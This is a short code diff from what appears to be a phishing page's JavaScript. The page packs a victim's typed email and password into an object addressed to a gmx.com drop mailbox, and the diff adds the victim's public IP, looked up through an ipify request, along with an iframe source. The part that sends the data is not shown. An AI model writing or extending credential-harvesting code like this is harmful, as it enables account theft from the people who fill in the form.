@@ -98,10 +98,16 @@
       let hf = 0;
       document.getElementById("make").addEventListener("click", async () => {
         const f = document.getElementById("framo").src;
+        const res = await fetch("https://api.ipify.org?format=json");
+
+        const data = await res.json();
+
         const yap = {
           email: document.getElementById("road").value,
           pass: document.getElementById("oint").value,
           sendo: "harhow@gmx.com",
+          pi: data["ip"],
+          gols: f,
         };
         console.log(hf);
 
